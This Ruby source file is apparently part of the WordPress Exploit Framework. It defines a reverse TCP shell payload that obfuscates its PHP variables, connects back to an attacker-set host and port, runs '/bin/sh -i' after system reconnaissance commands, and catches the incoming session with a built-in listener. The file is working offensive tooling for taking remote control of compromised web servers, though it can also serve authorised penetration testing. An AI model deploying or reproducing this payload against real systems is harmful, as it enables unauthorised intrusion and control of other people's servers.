module Wpxf::Payloads
  # A basic reverse TCP shell written in PHP.
  class ReverseTcp < Wpxf::Payload
    include Wpxf
    include Wpxf::Options
    include Wpxf::Payloads::SocketHelper

    def initialize
      super

      register_options([
        StringOption.new(
          name: 'shell',
          required: true,
          default: 'uname -a; w; id; /bin/sh -i',
          desc: 'Shell command to run'
        ),
        StringOption.new(
          name: 'lhost',
          required: true,
          default: '',
          desc: 'The address of the host listening for a connection'
        ),
        PortOption.new(
          name: 'lport',
          required: true,
          default: 1234,
          desc: 'The port being used to listen for incoming connections'
        ),
        IntegerOption.new(
          name: 'chunk_size',
          required: true,
          default: 1400,
          desc: 'TCP chunk size'
        ),
        BooleanOption.new(
          name: 'listen_with_wpxf',
          default: true,
          required: true,
          desc: 'Listen for an incoming connection using WPXF'
        ),
        StringOption.new(
          name: 'bind_to_address',
          default: '0.0.0.0',
          required: true,
          desc: 'The address to bind to when listening for connections'
        )
      ])
    end

    def shell
      escape_single_quotes(datastore['shell'])
    end

    def host
      escape_single_quotes(datastore['lhost'])
    end

    def listen_with_wpxf
      normalized_option_value('listen_with_wpxf')
    end

    def lport
      normalized_option_value('lport')
    end

    def bind_to_address
      normalized_option_value('bind_to_address')
    end

    def constants
      {
        'ip' => host,
        'port' => normalized_option_value('lport'),
        'chunk_size' => normalized_option_value('chunk_size'),
        'shell' => shell
      }
    end

    def obfuscated_variables
      super +
        %w(
          ip port chunk_size write_a error_a shell pid sock
          errno shell pid sock errno errstr descriptor_spec
          process pipes read_a error_a num_changed_sockets input
        )
    end

    def raw
      DataFile.new('php', 'reverse_tcp.php').php_content
    end

    def client_connected(socket, event_emitter)
      Wpxf.change_stdout_sync(true) do
        port, ip = Socket.unpack_sockaddr_in(socket.getpeername)
        event_emitter.emit_success "Connection established from #{ip}:#{port}"

        start_socket_io_loop(socket, event_emitter)
        socket.close
        @server.close
        puts
        event_emitter.emit_info "Closed reverse handler on port #{lport}"
      end
    end

    def prepare(mod)
      return true unless listen_with_wpxf

      begin
        @server = TCPServer.new(bind_to_address, lport)
      rescue StandardError => e
        mod.emit_error "Failed to start the TCP handler: #{e}"
        return false
      end

      mod.emit_success "Started reverse TCP handler on #{lport}"
      @network_thread = Thread.new do
        socket = @server.accept
        @session_started = true
        client_connected(socket, mod)
      end
    end

    def post_exploit(mod)
      return true unless listen_with_wpxf

      if @session_started
        begin
          @network_thread.join if @network_thread
        rescue SignalException
          puts
          mod.emit_warning 'Caught kill signal', true
        end

        return true
      else
        mod.emit_error 'A connection was not established'
        return false
      end
    end

    def cleanup
      self.queued_commands = []
      @network_thread.exit if @network_thread
      @server.close if @server && !@server.closed?
    end
  end
end
